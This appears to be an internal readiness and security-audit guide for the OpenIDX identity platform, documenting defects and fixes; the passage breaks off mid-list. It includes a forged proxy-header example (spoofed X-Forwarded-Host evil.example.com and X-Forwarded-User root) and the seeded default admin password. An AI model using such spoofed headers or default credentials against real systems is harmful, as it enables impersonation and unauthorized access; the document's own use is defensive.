# OpenIDX Project Readiness — the User-Perspective Guide

**Date:** 2026-09-01 (audited at commit `c98082a` on `main`; updated the
same day as the program ships on this branch — §4 status: **P0 done, the
P1 A-defect tail done (A2/A3/A4, plus the post-audit A5: SMS/email OTP
fail closed, OTP and OAuth authorization codes out of the logs, the
`SMS_PROVIDER`-typo mock fallback removed), P2 done in full** (docs site, quickstart
fold + banners, PAM guide **and the full `/pam/*` OpenAPI spec**, auditor
artifacts: [threat model](./THREAT-MODEL.md) and
[control mapping](./COMPLIANCE-CONTROL-MAPPING.md), doc-tree separation
via [docs/README.md](./README.md)), **P3.2–3.5 done** (Helm chart
finished *and published per release* — migration hook Job, real OPA,
ServiceMonitor, backup CronJob, Keycloak/APISIX ghosts removed, chart
pushed to GHCR as a signed OCI artifact on every tag; WebAuthn→Redis;
signed releases; Dependabot/Renovate dedupe; dead surfaces pruned; a
second site truth-sweep fixed the remaining phantom install/config
surfaces), **and P4 is well under way** (console i18n, EN + TR: the landing page,
the entire login surface, the app chrome, the whole navigation layer
with bilingual search, and **every end-user page** — dashboard, portal,
security, access, sessions, devices, trusted browsers, notifications,
access requests, profile — are fully bilingual; the end-user experience
is complete in both languages). Open: P1 rollout Task 16 (operator
action), the remaining P4 items incl.
the browser-based accessibility audit behind a VPAT and the separate end-user bundle — every console page body is now bilingual, and the automatable half of accessibility is gated.)

**Re-review 2026-09-04.** A second full audit (backend, console/mobile/agent,
release/ops/docs — every load-bearing claim re-read in the code) found the
next layer of the same defect class this guide was written for, plus one
error of its own: the release premise. `git ls-remote --tags` shows
**v1.28.0 … v1.33.3** were cut (the audit clone was shallow with no tags),
so "cut v1.28.0" below is struck and the next tag is **v1.34.0**. The
completion program is §4 **P5–P8**, preceded by the maintainer's ratified
decisions; §6 now carries a scorecard that names the CI job or test that
proves each Definition-of-Done item.
**Question this document answers:** *Is OpenIDX fully functional and well defined end to end, as experienced by the people who use it — and what are the next steps and controls to get it there?*

This is the product-and-user-side companion to
[PRODUCTION-READINESS.md](./PRODUCTION-READINESS.md) (the deploy-side view,
last refreshed 2026-06-08). It was produced by a fresh full-repo audit:
backend (all `cmd/` + `internal/`), frontend (all apps), deployment assets,
and all 122 docs, with the headline findings re-verified against the code.
`go build ./...` passes clean on the audited commit.

Read §1 if you are confused about how IAM, IGA, PAM and ZTNA fit together.
Read §2–§3 for the honest state of the product. Read §4 for what to do next,
in order. Read §5 for the recurring controls that keep the project ready.

---

## 1. The mental model (this resolves the IAM/PAM/ZTNA confusion)

OpenIDX is **one product with four pillars**, not four products. Each pillar
answers a different question about the same person:

| Pillar | The question it answers | What the person actually experiences |
|---|---|---|
| **IAM** (identity) | *Who are you, and is it really you?* | The login page, MFA prompts, passkeys, SSO into apps, "My Security", sessions |
| **IGA** (governance) | *Who approved that you have this, and for how long?* | Access requests, approvals, access reviews / certifications, SoD blocks, JIT expiry |
| **PAM** (privileged access) | *How do you borrow powerful credentials safely?* | Credential vault checkout, brokered SSH/RDP in the browser, recorded sessions |
| **ZTNA** (network, via OpenZiti) | *How do you reach things that have no public door?* | The endpoint agent / BrowZer, "My Apps & Network", dark services with no inbound port |

What makes them **one product** is the spine they share:

```
one identity  →  one grant (application assignment)  →  one policy plane
       →  one audit trail (unified_audit_events)  →  one kill switch
```

A decision made anywhere propagates everywhere: disable a user and IAM
sessions, vault checkouts, live privileged sessions **and** Ziti network
circuits are severed (three enforcement layers, ≤30 s worst case — see
[IAM_PAM_ZITI_INTERRELATION.md](./IAM_PAM_ZITI_INTERRELATION.md), the best
conceptual doc in this repo).

### 1.1 Why it still *feels* confusing — the four parallel access systems

The confusion is real and structural, and the project has already diagnosed
it ([access-model-redesign.md](./access-model-redesign.md)): historically,
**four independent mechanisms decided what a user can reach, and they did
not talk to each other**:

1. Application assignments (`user_application_assignments`) — what the
   launcher and governance *display*, enforced by **nothing**;
2. Proxy route roles/groups (`proxy_routes.allowed_roles`) — what the web
   proxy enforces;
3. Ziti dial policies — what the network overlay enforces (by default, for
   *every* enrolled identity, regardless of assignment);
4. PAM entry grants — what privileged connect/reveal enforces.

So an admin could "assign an app" and grant nothing, and a user could reach
an app that never appeared in their portal. **The fix is designed, planned
([access-and-login-convergence-design.md](./access-and-login-convergence-design.md),
[plans/2026-08-30-access-and-login-convergence.md](./plans/2026-08-30-access-and-login-convergence.md))
and — as of #878/#880 — fully landed in code**: one predicate package
(`internal/appaccess`) consumed by the portal, the Ziti reconciler, the
proxy and `/oauth/authorize`, plus one SPA login and a real MFA policy.

**The login half is now unconditional and the enforcement half still
defaults to the old behaviour.** The server-rendered login is deleted (P6.1),
so every client reaches the one login UI at `OAUTH_LOGIN_URL` — there is no
`OAUTH_LOGIN_UI` flag any more. `ACCESS_ASSIGNMENT_ENFORCE` still defaults to
`false`, so until the staged rollout (Task 16 of the plan) is executed on a
deployment, *assignment is still a catalogue, not a grant*. Executing that
rollout is the single highest-leverage step this project can take — see §4,
P1.

### 1.2 The missing glossary (use these words consistently)

| Term | Means | Does **not** mean |
|---|---|---|
| **Application** | A thing users launch (OIDC/SAML client and/or a published route) | A Ziti service (that's the transport underneath) |
| **Route** (`proxy_routes`) | The published web path to an application, optionally Ziti-overlaid | An access grant |
| **Service** (Ziti) | A dark network endpoint dialable over the overlay | Something users see by name |
| **Assignment** | The admin act of granting an application to a user/group — *the* grant once convergence is enforced | (today, pre-rollout) an enforcement |
| **Entitlement / grant** | What governance reviews and certifies (assignments, roles, vault grants, JIT) | — |
| **Policy** | A rule evaluated at decision time (MFA policy, ABAC/OPA, dial policy, approval policy) | A grant |

A user-facing version of §1 belongs in the published docs — nothing there
explains the four pillars together today (see §3.3).

---

## 2. Verdict snapshot

**The platform is genuinely built.** ~190k lines of non-test Go across 36
domains, 1,463 HTTP routes, 137 migrations, 514 test files (~118k test
lines), 8 services with a fail-closed production startup gate. The admin
console's ~107 pages are **all wired to real APIs — zero mocked pages**
(verified by sweep — 552 distinct console calls, 0 unmatched against the
1,064 backend route registrations; the CI "contract test" itself is one
string match and is replaced in P6). Core crypto is right: Argon2id passwords with
rehash-on-verify (`internal/common/pwhash/pwhash.go`), RS256 pinned with
type assertions everywhere, AES-256-GCM envelope encryption with KEK
rotation and a `cmd/rekey` tool, FORCE row-level security with a
merge-blocking tenant linter (`tools/orgscope`).

**Where it is not ready, the pattern is consistent:** a control or a story
*displays* without being *true* —

| Symptom | Examples |
|---|---|
| Controls that display but don't enforce | All fixed on this branch except the flag flip: admin "revoke session" was inert (§3.1-A1), the IP threat list was ignored by login risk scoring (A2), voice MFA displayed over a no-op backend (A3), SAML SLO never notified SPs (A4), SMS/email OTP reported "sent" while logging the plaintext codes (A5). Remaining: assignment isn't a grant until the rollout flips (§1.1). **Found 2026-09-04 (P5):** ABAC policies enforce nothing (their only consumer is the page's own "test" button), OPA `deny` is computed and discarded, AI-recommendation "Apply" and ISPM "Remediate" report success without acting, ISPM rule toggles change nothing the scan reads, `SMS_PROVIDER=mock` defeats the 501 gate A5 built, and three table families (`ispm_*`, `ai_agents*`, `ai_recommendations`) have no `org_id` at all — cross-tenant read *and* mutation from the console |
| First contact fails | Fixed on this branch: the getting-started doc left a new user unable to log in, and the README quick start referenced files that don't exist. Also fixed: `helm install` now bootstraps its own schema (migration hook Job) |
| The trust story contradicts itself | `SECURITY.md` still says "multi-tenant SaaS isolation is not implemented" while README and SECURITY-TENANCY.md (correctly) say the opposite; the published docs site describes a Keycloak-based product with **no PAM or ZTNA sections at all** |
| Shipped but unreleased | **Corrected 2026-09-04:** the last release is **v1.33.3 (2026-08-25)**, eight releases after the v1.27.0 this guide first cited (the audit clone was shallow and had no tags). What is unreleased is this branch. What is *wrong* is the release hygiene: `CHANGELOG.md` was never advanced through those eight releases (359 already-shipped lines under `[Unreleased]`, none of this branch's), four version pins disagree, and no cut release is signed — P8 |

None of this is scaffolding rot. It is a codebase maturing faster than its
enforcement wiring, docs, and release process. That gap is closable with
focused work, and §4 sequences it.

---

## 3. End-to-end readiness, journey by journey

The user's definition of "fully functional" is: every journey below
completes without a workaround. Status: ✅ works · ⚠️ works with material
caveats · ❌ broken/missing.

| # | Journey (persona) | Status | The caveat that matters |
|---|---|---|---|
| J1 | **First run** — deploy → log in → rotate admin → create org (operator) | ✅⚠️ | *Fixed on this branch:* README quick start is now the working compose path with the first-login credential and a hardware floor; `GETTING-STARTED.md` carries the authoritative First Login section; production refuses to start on the unrotated default admin. *Also fixed:* the Helm chart now runs migrations itself (post-install/pre-upgrade hook Job) and actually deploys the OPA its `opaUrl` points at — `helm install` bootstraps a working deployment. |
| J2 | **Joiner** — create/sync user → enroll MFA → first login → sees their apps (end user) | ✅ | Real: user CRUD/SCIM/directory sync, MFA wizard (TOTP/WebAuthn/push/recovery), portal. *Fixed on this branch:* WebAuthn ceremonies now live in Redis with a TTL (passkeys survive >1 replica; the in-memory map is a single-replica fallback with lazy expiry); phone-call MFA fails closed with a 501 instead of pretending (A3); SMS/email OTP fail closed too, and the typo'd-`SMS_PROVIDER`-silently-becomes-a-mock fallback is gone (A5) — an unconfigured or misconfigured factor now answers 501, never "code sent". |
| J3 | **App access** — publish app → assign → user launches with SSO → reach matches (admin + user) | ⚠️ | SSO itself is solid (OIDC/PKCE, SAML, consent). But assignment drives real reach **only after the convergence rollout** (§1.1). Today the report-only machinery observes the gap; `#874` already made "My Apps & Network" show enforced truth. Execute rollout Task 16. |
| J4 | **Network access** — enroll agent/BrowZer → posture check → reach a dark service (end user) | ✅ | Real: Windows/Android agents, BrowZer clientless, posture checks, reconciler, `tools/darkprobe` proves dark services are reachable only by authorized identities, and a "going dark" runbook exists. Per-app scoping of dial policies arrives with the same rollout as J3. |
| J5 | **Privileged access** — request → approve → checkout/brokered session → recording → review (engineer + auditor) | ✅❌ | Functionally the strongest pillar: vault with rotation, Guacamole + in-browser wasm-SSH, recordings with encryption/retention/legal hold, break-glass. But **zero user-facing PAM documentation and zero OpenAPI coverage** of `/pam/*` — a headline pillar that is invisible to evaluators and undocumented for users. |
| J6 | **Governance loop** — access request → approval → certification campaign → revoke propagates (manager/auditor) | ✅ | Requests, multi-step approvals, campaigns, SoD (fail-closed), JIT expiry all wired; application fulfillment gap was closed (`internal/governance/workflows.go`). |
| J7 | **Leaver / incident** — disable or kill-switch a user → everything severed (admin) | ✅⚠️ | The strong path: deprovision + lifecycle sweep + Ziti sweep sever IAM/PAM/network in ≤30 s; kill switch is synchronous and honest about partial failures. The broken path: **the admin console's per-session "Revoke" is cosmetic** — see A1 below. |
| J8 | **Operate** — monitor → audit → back up → restore → upgrade (operator) | ⚠️ | Compose-prod path, backup CLI with *automated restore verification*, DR/HA drills (`make dr-game-day`, `ha-drill`) are genuinely good. *Fixed on this branch:* the security workflow's nightly gate and govulncheck now actually fail on findings. Remaining caveats: the Helm path is proven by lint/template only (an install proof lands in P6); no *cut* release is signed yet (cosign exists only on this branch — v1.34.0 will be the first); CHANGELOG and version pins are eight releases behind (P8). |

### 3.1 The specific defects behind the ⚠️s (verified, with fixes)

**A. Controls that display but don't enforce** — worst class for a security
product; either wire them or remove them from the UI.

- **A1 — Admin session revocation is inert (P0).**
  `internal/admin/sessions.go` (`DELETE /sessions/:id` and
  `DELETE /users/:id/sessions`) only sets `sessions.revoked=true` in
  Postgres. Enforcement reads **Redis**: the refresh grant checks
  `revoked_session:<id>` (`internal/oauth/service.go:3532`), and the DB
  column is read by `IsSessionValid` — which has zero production callers.
  Result: the UI shows "revoked", and the user's refresh token keeps
  minting access tokens indefinitely. Four other paths do this correctly
  (deprovision `internal/identity/service.go:835`, kill switch, SCIM,
  session policy) — the admin path was simply missed. Fix: publish the
  same Redis markers from both admin handlers (the `redis` client is
  already on the admin `Service`). Note even when fixed, already-minted
  access tokens live up to their TTL (default 1 h) because request-path
  middleware checks signature+expiry only; the kill switch remains the
  incident-response path.
- **A2 — IP threat list didn't feed login risk.** *Shipped on this branch:*
  the placeholder `isIPBlocked` is gone. The login score
  (`risk.Service.CalculateRiskScore`) gains an `ip_threat_list` factor at
  **+70 — exactly the step-up threshold**, so a listed source alone forces
  MFA (and denies an MFA-less account); the weighted `Scorer`'s
  `ip_reputation` signal gets the real lookup via an injected checker.
- **A3 — Voice-call MFA was a dead feature** (enrollable, never verifiable;
  provider never instantiated; the stub returned fake call SIDs). *Shipped
  on this branch:* the flow now fails closed and loudly —
  `CreatePhoneCallChallenge` refuses with a 501 "not configured on this
  installation" when no provider is wired, and the stub Twilio provider
  errors instead of fabricating success. Wiring a real call provider stays
  optional follow-up work.
- **A5 — SMS/email OTP pretended too, and logged the codes** *(found and
  fixed after the original audit, while extracting the landing page's MFA
  claims)*: with no SMS provider or email service wired,
  `sendSMSOTP`/`sendEmailOTP` wrote the **plaintext OTP code into the
  logs** (a comment claimed "dev mode only" — there was no gate) and
  returned success; all four enroll/challenge paths swallowed send
  failures, so the API answered "verification code sent" for codes that
  went nowhere. Deeper still: `sms.Service.SendOTP` returned success when
  sending was *disabled* in config, and a **typo'd `SMS_PROVIDER` fell
  back to a mock** that "delivers" nothing (the J2 caveat). *Shipped on
  this branch:* both factors gate up front like A3 (typed errors → 501
  "not configured"), send failures fail the call, codes never reach logs,
  disabled sending refuses (`sms.ErrSMSSendingDisabled`), unknown
  provider names are a startup/config error instead of a mock, and the
  identity main no longer substitutes a fallback mock (the nil-interface
  trap is guarded). The explicitly configured `mock` provider remains for
  development. Same sweep: `internal/oauth/store.go` logged **raw OAuth
  authorization codes** (bearer credentials until exchanged) at
  error/debug level — replaced with a non-reversible `code_ref`
  (SHA-256 prefix) that still correlates store→consume→delete events.
- **A4 — SAML Single Logout never sent the LogoutRequest**
  (`internal/oauth/saml_slo.go` built the URL and logged it). *Shipped on
  this branch:* the back-channel dispatch is real — the LogoutRequest is
  delivered to each SP's SLO endpoint over the HTTP-Redirect binding,
  signed per SAML Bindings 3.4.4.1 (SigAlg + Signature), through the
  service's circuit-breakered outbound client, with delivery failures
  logged as such instead of pretending.
- **A5 — Assignment isn't a grant until the rollout flips** (§1.1) — the
  systemic instance of this class.
- Minor same-class: DB-backed feature flags silently fall back to memory
  (`internal/feature/flag.go:295`); gateway `logInfo`/`logError` are empty
  bodies (`internal/gateway/service.go:235`).

**B. First-contact failures** — what a new operator/evaluator hits in hour one.

- **B1 — Default admin `admin@openidx.local` / `Admin@123` seeds every
  install including production** (`internal/migrations/sql.go:517`,
  migration v10). *Shipped on this branch:* a DB-backed startup gate
  (`identity.EnsureDefaultAdminRotated`,
  `internal/identity/default_admin_gate.go`) makes the identity and oauth
  services **refuse production startup** while an enabled account still
  authenticates with the seeded password (verified with the login path's
  own `pwhash.Verify`, so a re-hash of the same password is caught).
  Still open as a follow-up: forcing a password change on first login in
  non-production environments.
- **B2 — You cannot log in by following the docs.** *Shipped on this
  branch:* `GETTING-STARTED.md` now carries the one authoritative
  **First Login** section with the verified credential (`Admin@123`,
  bcrypt-checked against the seed hash); `USER_GUIDE.md` and the seed
  CLI's printed credentials are corrected to match.
- **B3 — README quick start was wrong three ways.** *Shipped on this
  branch:* the quick start is now the working path
  (`generate-secrets.sh` → compose from `deployments/docker/`), with the
  first-login credential, a hardware floor, an honest local-chart Helm
  section, real documentation links, no Keycloak in `make dev` output,
  and `install.cmd` (an unrelated CLI bootstrap script) deleted.
- **B4 — `helm install` yields a non-working deployment** — ✅ *fixed on
  this branch*: as audited there was no migration Job/hook (docs claimed
  `AUTO_MIGRATE=true` did it — the flag does exist,
  `internal/common/config/config.go:480`, honoured by
  `cmd/identity-service/main.go:97`, but the chart never set it; the
  2026-09-01 wording "exists nowhere" was wrong), `opa.enabled` was inert with
  `opaUrl` pointing at a Service the chart never created (governance is
  fail-closed → breaks), `apisix.enabled` deployed nothing, and
  `Chart.yaml` still declared a Keycloak dependency. Now: a
  post-install/pre-upgrade migration Job (new `tools` image), a real OPA
  Deployment/Service behind `opaUrl`, the fake `apisix`/`keycloak` values
  gone, plus a ServiceMonitor and backup CronJob (both opt-in) — with the
  hardened `networkPolicy` profile taught to admit the new migrate/backup/
  OPA traffic.
  Open — tracked as P3; the README no longer advertises it as hosted.
- **B5 — Grafana shipped admin/admin; dev-kube applied changeme secrets.**
  *Shipped on this branch:* `GRAFANA_ADMIN_PASSWORD` is now required with
  the same fail-fast syntax as the other compose secrets (generated by
  `scripts/generate-secrets.sh`, listed in `.env.production`), and
  `scripts/dev-kube.sh` generates random cluster secrets on first deploy
  instead of applying the committed `changeme-*` template.

**C. Trust-story contradictions** — what a client's security reviewer reads.

- **C1 — `SECURITY.md` §Trust Model said single-tenant / "multi-tenant
  SaaS isolation is not implemented"**, contradicting README and
  `SECURITY-TENANCY.md`. *Shipped on this branch:* the trust model now
  states the enforced FORCE-RLS multi-tenant reality (with an explicit
  note that earlier revisions said otherwise); the stale single-tenant
  claims in `GETTING-STARTED.md` and `SECURITY-HARDENING.md` are
  corrected, and `SECURITY-TENANCY.md`'s dangling gap-register link now
  points at this guide.
- **C2 — The published docs site (mkdocs) is a different, older product**:
  only 31 of 122 docs published, no PAM or ZTNA sections in the nav,
  `docs/docs/guide/architecture.md` names "Keycloak 23" as the IdP. The
  excellent conceptual docs (§1's reading list) are all unpublished.
- **C3 — No threat model, no compliance control mappings** (SOC 2 / ISO
  27001 exist only as report *types* the audit service emits), OpenAPI
  specs pinned at 0.1.0 with ~7–42% route coverage and phantom services;
  dangling references to docs that never existed
  (`MARKET_GAP_ANALYSIS_2026.md`, `ULTIMATE_PRODUCT_PLAN.md`).
- **C4 — Stale entry-point docs actively mislead**: `PROJECT-STATUS.md`
  (May) drops PAM/IGA from the product definition and calls Helm/Terraform
  incomplete; `FEATURE_PRIORITY_PLAN.md` lists long-shipped features as
  "must implement"; `TESTING.md` instructs authenticating against Keycloak.

**D. Surface sprawl** — decide, then delete. ✅ *Pruned on this branch,
except the mobile decision:*

- Two overlapping mobile apps. **The 2026-09-01 characterisation was
  inverted.** `client/` (Flutter over the gomobile engine — posture and
  Ziti are the same Go code as the desktop agent) builds Android *and*
  iOS in CI and ships the APK on every `v*` tag; `mobile/` (Expo) has
  never been compiled (its native Ziti module has no build), carries a
  duplicate `android.package` in `app.json` that resolves to
  `com.anonymous.openidxmobile`, and its only workflow is dispatch-only
  and exits without `EXPO_TOKEN`. *Decided 2026-09-04: Flutter ships;
  `mobile/` is deleted (P7).*
- ✅ Dead/vestigial surfaces deleted: `frontend/` (committed pre-built JS
  bundle + duplicate Playwright suite), `web/admin-console/keycloak-theme/`
  (skeleton with no references), orphaned `pages/branding.tsx` (+ its
  test; the `/branding` route already redirected to tenant-management),
  and the 13 legacy `.sql` files no runner loaded — including the one
  seeding an admin credential (`011_add_admin_users.sql`). The
  `.up/.down` migration pairs, which the seed command and migrate
  scaffolding really use, stay.
- ✅ `landing.tsx` no longer hardcodes unsubstantiated claims (99.99%
  SLA, <50 ms, 70% savings): the stats row states verifiable facts (four
  pillars, eight services, open source, dark services) and the
  performance card describes the real HA posture. *Correction, second
  pass:* that first fix missed the rest of the page — the hero badge
  still said "70% Less Cost", and the page offered a free trial, a
  credit-card promise, "thousands of organizations", a `#pricing` anchor
  with no pricing section, dead `href="#"` footer links, and the wrong
  GitHub org. All rewritten to checkable facts (Apache-2.0, self-hosted,
  real docs/GitHub/SECURITY/threat-model links); a regression test now
  pins that the page "makes no claims a self-hosted OSS project cannot
  keep" (no *trial*, *credit card*, *70%*, *pricing*, or `href="#"`).

**E. Enterprise gates** (not blockers today, but the next "no" from a buyer):
no i18n at all (~107 pages of hardcoded English), accessibility far below
VPAT/WCAG expectations (~40 aria attributes console-wide), end users share
the admin bundle behind role gates only, release binaries unsigned/no
checksums, WebAuthn single-replica limit (J2). *Since fixed on this
branch:* signed releases (P3.4), WebAuthn→Redis (P3.3), and the i18n
framework with EN/TR catalogs (P4.1 — extraction of the remaining pages
is the open part).

---

## 4. Next steps — the program, in priority order

Each phase has an exit test. Don't start the next phase's *announcements*
before the previous phase's exit test passes — code can proceed in parallel.

### P0 — Make displayed controls true, and first contact survivable — **SHIPPED on this branch**

All six items landed with this guide (commits on
`claude/project-readiness-security-controls-c797kg`):

1. ✅ **Admin session revocation publishes Redis markers** (A1) — with
   tests pinning the key format enforcement reads.
2. ✅ **Default-admin hole closed** (B1/B2) — production startup gate in
   identity + oauth services, one authoritative First Login section, all
   credential mentions aligned to the verified `Admin@123`. *Follow-up
   still open:* forced password change on first login in dev.
3. ✅ **Trust contradiction fixed** (C1) — `SECURITY.md`,
   `GETTING-STARTED.md`, `SECURITY-HARDENING.md` now tell the FORCE-RLS
   story the code enforces.
4. ✅ **README first-run fixed** (B3) — working quick start, hardware
   floor, honest Helm section, real doc links, `install.cmd` deleted.
5. ✅ **Security CI gates** (J8) — the nightly aggregate gate lost its
   `continue-on-error`, and govulncheck is blocking (verified clean at
   arming time). gitleaks/npm-audit/semgrep stayed non-blocking at the
   time — *decided 2026-09-04: they become blocking on CRITICAL/HIGH
   (P6); §5.1 is the rule and this line was the exception.* *The gate
   has since done its job:* it caught
   GO-2026-6354/6355 (SSH channel-deadlock DoS in `golang.org/x/crypto`,
   reachable from the PAM broker's `ssh.Dial` / `ssh.NewClientConn`) on
   this branch, fixed by moving to `x/crypto` v0.56.0 — which raises the
   build floor to Go 1.26, now pinned in `go.mod` and matched across CI
   and the docs. Verified with `govulncheck ./...` reporting 0 called
   vulnerabilities.

   Moving the floor had two consequences worth recording, because both are
   the same class of bug — *a toolchain version leaking somewhere it was
   never meant to be authoritative*:

   - **Formatting is now gated by the module's own toolchain.** `gofmt`'s
     alignment heuristics differ between Go releases, and golangci-lint's
     `gofmt` formatter is the one baked into the *linter binary* (v2.13.2
     ships built with go1.27), not the one `go.mod` pins. So CI began
     demanding a layout that no contributor's `gofmt -w` would produce.
     The formatter is dropped from `.golangci.yml` and replaced by an
     explicit `gofmt` step in `ci.yml` that runs the pinned toolchain over
     `go list ./...` — the gate now asks for exactly what you get locally,
     and cannot drift the next time the linter is bumped.
   - **The mobile engine deliberately does *not* track the root module.**
     `agent/` is a separate module (`go 1.25.0`) and never needed 1.26;
     bumping the mobile workflows to it broke `flutter build ios` with
     undefined `_res_9_ninit`/`_nsearch`/`_nclose` — Go 1.26's darwin
     resolver pulls in libresolv, and the gomobile static framework never
     declares that link requirement. Those two workflows stay on 1.25.x
     with the reason in a comment.
   - ✅ **The agent's supply chain is closed — and the gate that missed it
     is fixed.** `agent/` declared `go 1.25.0` with no `toolchain` line, so
     it resolved to the go1.25.0 stdlib and carried **29 advisories the
     agent's own code reaches** (`crypto/tls` GO-2025-4008 via the Ziti
     dialer and the SSO listener, `crypto/x509` GO-2025-4007 via Ziti
     enrolment). The first read of this was that closing it needed the Go
     1.26 move, and so the podspec work first; that was wrong. Every one of
     those advisories is fixed *inside* the 1.25 line (1.25.3), so
     `agent/go.mod` now pins `toolchain go1.25.13` and stays on 1.25 — no
     libresolv exposure, no podspec change needed. The one advisory left
     after that was a dependency, not the stdlib: `golang.org/x/net` v0.52.0
     (GO-2026-5942, reached through pion/webrtc's `SetLocalDescription` →
     `dnsmessage.Message.Unpack`), now v0.57.0, matching the root module.
     **`govulncheck ./...` in `agent/` goes 29 → 0.** The deeper defect was
     the gate itself: both govulncheck jobs ran `govulncheck ./...` from the
     repo root, which stops at the module boundary, so they reported "0
     reachable vulnerabilities" while never once looking at the agent. Both
     jobs now scan `agent/` as a second blocking step. The `-lresolv` link
     flag is also in place now (`s.libraries = 'resolv'` in the
     `openidx_engine` podspec, verified by CI's `build-ios`): staying on 1.25
     is a deliberate choice rather than a constraint, and a future 1.26 move
     is a version bump rather than an investigation into three undefined
     symbols.
6. ✅ **Grafana admin/admin fallback removed; dev-kube generates real
   secrets** (B5).
7. ✅ **CI stops going red on other people's outages.** `build
   (identity-service)` failed on a commit that touched no Dockerfile:
   Docker Hub answered the HEAD for `library/alpine/manifests/3.24` with a
   **502**, so BuildKit died in 19 seconds at metadata resolution, before a
   layer was built — while the other nine matrix legs pulled the same two
   images successfully on the same commit. `helm dependency build` has the
   same shape against the bitnami CDN. Neither is a defect in this tree, and
   a red tick that means "someone else's registry was rolling" trains people
   to ignore red ticks, which is the expensive failure. So: the Docker build
   is spelled twice — the first attempt may fail, the second runs only if it
   did, 30s later — and the chart-dependency fetch goes through
   `scripts/ci-retry.sh` (3 attempts, exponential backoff). **Neither can
   hide a real failure:** the retry wrapper exits with the command's own
   status once the attempts are spent, and a broken Dockerfile fails both
   attempts. Both properties are gated, not trusted — `ci-retry.test.sh`
   proves rc 7 still comes out as rc 7, and `check-docker-retry-drift.sh`
   fails CI if the two build blocks ever stop being identical (a drifted
   retry would build, and on a push publish, an image the first attempt
   never tried).

8. ✅ **Both proxies stop forwarding the caller's own claims about who it
   is.** This started as deprecation cleanup — Go 1.26 deprecates
   `httputil.ReverseProxy.Director`, and the ZTNA route proxy and the Ziti
   overlay proxy both set one. Migrating to `Rewrite` turned out to close a
   real hole. On the `Director` path the standard library never deletes the
   caller's `Forwarded` / `X-Forwarded-Host` / `X-Forwarded-Proto` headers and
   folds the caller's `X-Forwarded-For` into the outbound one, so a request
   arriving with `X-Forwarded-For: 9.9.9.9, X-Forwarded-Host:
   evil.example.com` reached the upstream with **`evil.example.com` intact**,
   and through the overlay proxy with **`9.9.9.9` as the leftmost
   `X-Forwarded-For` entry** — the entry an upstream reads when it wants "the
   real client". Worse, the headers the proxies *own* (`X-Forwarded-User`,
   `-Email`, `-Name`, `-Roles`, `X-Ziti-Identity`) are in no library delete
   list, so on a `require_auth: false` route, or an overlay connection whose
   Ziti identity did not resolve, the caller's own `X-Forwarded-User: root`
   went straight through to an upstream whose only reason to trust that header
   is that this proxy sets it. Both hooks now delete that whole namespace
   before writing anything, and every value the upstream receives is one the
   proxy determined itself: identity from the verified session or the enrolled
   Ziti identity, the client address from gin's resolved peer (which honours
   the deployment's trusted-proxy list — `SetXForwarded()` is deliberately not
   used, because it would ignore that configuration). Nine tests in
   `internal/access/proxy_forwarding_test.go` send a fully forged header set
   through both real proxies and assert on what the upstream actually
   receives; §4.4 of the threat model carries the row.

9. ✅ **The documented first run did not work — three separate stoppers, in
   the first two commands.** The exit test below says "run it". Running it is
   what found these; every one of them halted the install, and every one was
   invisible because **nothing in CI, no test and no Makefile target had ever
   executed `scripts/generate-secrets.sh`**. (a) The script aborted on its own
   first line of work: `tr -dc … </dev/urandom | head -c 32` under
   `set -o pipefail` always ends with `tr` killed by SIGPIPE — /dev/urandom
   never ends, so `tr` is still writing when `head` has its bytes — the
   pipeline returns 141 and `set -e` quits. Three generators had that shape,
   so **the script had never produced a `.env` at all**, and the README calls
   it the file "compose refuses to start without". It now draws from a bounded
   read, slices in bash, and asserts each secret's length rather than risk
   silently handing out a short key. (b) `docker-compose.yml` declares
   `OPENIDX_APP_PASSWORD` and `APISIX_ADMIN_KEY` required — in an error message
   that tells the operator to run this script — and the script wrote neither.
   Both are safe to generate, because both sides read the same value
   (`set-app-role-password.sh` sets the `openidx_app` role's password from the
   first; APISIX resolves the second from its own container environment).
   (c) Compose interpolates `${VAR}` from a `.env` in the **project**
   directory, which is the directory holding the compose file — so the `.env`
   written at the repo root was never seen by the documented
   `docker compose -f deployments/docker/docker-compose.yml` command, and the
   two README steps did not work together at all. The generator now links the
   file where compose looks (a symlink, so there is one file and the two
   cannot drift; `--project-directory .` would have fixed interpolation but
   re-rooted every relative bind mount). **Verified: the README's two commands
   now run clean, and `docker compose … config` resolves the whole stack.**
   `scripts/check-first-run.test.sh` runs that path in CI, and its case 4
   derives the required-variable list *from the compose file*, so the next
   `${VAR:?}` someone adds fails the build instead of the operator. All five
   defect classes were confirmed to make it go red.

10. ✅ **A dead Keycloak service with an `admin` default password, on an
   advertised path.** Found in the same sweep: `docker-compose.infra.yml` —
   which `make dev-infra` and the published dev-setup docs both tell you to
   run — still started `quay.io/keycloak/keycloak:23.0` with
   `KEYCLOAK_ADMIN_PASSWORD: ${KEYCLOAK_ADMIN_PASSWORD:-admin}`. That is the
   same default-credential class item 6 closed for Grafana, and it survived
   the Keycloak purge. It was also already broken: it bind-mounts
   `./keycloak/realm-export.json` and `./keycloak/themes`, a directory deleted
   in the earlier prune. Nothing depends on it and no Go or TypeScript reads a
   `KEYCLOAK_*` variable, so the service is deleted rather than given a
   required variable — and the generator no longer writes the `KEYCLOAK_*`
   block that told a new operator this platform runs on Keycloak.

*Exit test (run it — and it was run):* a new operator with only the README
reaches a logged-in, rotated-admin console; `security-scan.yml` goes red on a
seeded critical; revoking a session in the console kills the refresh token.
The first clause is now gated as far as this environment can take it — the
quick start's two commands run clean and compose resolves the full stack
(`scripts/check-first-run.test.sh`). What still needs a machine with a Docker
daemon is the rest of that sentence: containers actually reaching healthy, and
the first login through to a rotated admin password.

### P1 — One access model: execute the convergence rollout (~2–4 weeks, the anti-confusion fix)

Follow Task 16 of
[plans/2026-08-30-access-and-login-convergence.md](./plans/2026-08-30-access-and-login-convergence.md)
exactly — it is already written:

1. Deploy phases A+C (no behaviour change), verify `openidx-appdial-*`
   policies appear beside blanket ones.
2. Drive the **assignment report** (`/assignment-report`) to clean —
   create the assignments you actually intend; only trust it when
   `reachability_source=controller` and `incomplete_users=0`.
3. Set `OAUTH_LOGIN_URL` if the console is not on the issuer origin;
   verify console, mobile and BrowZer logins. There is no flag to flip and
   no fallback page — rehearse on staging.
4. ~~Delete the server-rendered login (plan Task 15).~~ Done in code (P6.1).
5. Flip `ACCESS_ASSIGNMENT_ENFORCE=true`; verify an unassigned user can no
   longer dial, and the denial is audited.
6. Create the first MFA policy (`{"factor_enrolled": true}`) and chase
   enrollment via MFA Management stats.

The P1 tail items are **already shipped on this branch**: A2 (threat list
→ risk score), A3 (voice MFA fails closed instead of pretending), A4
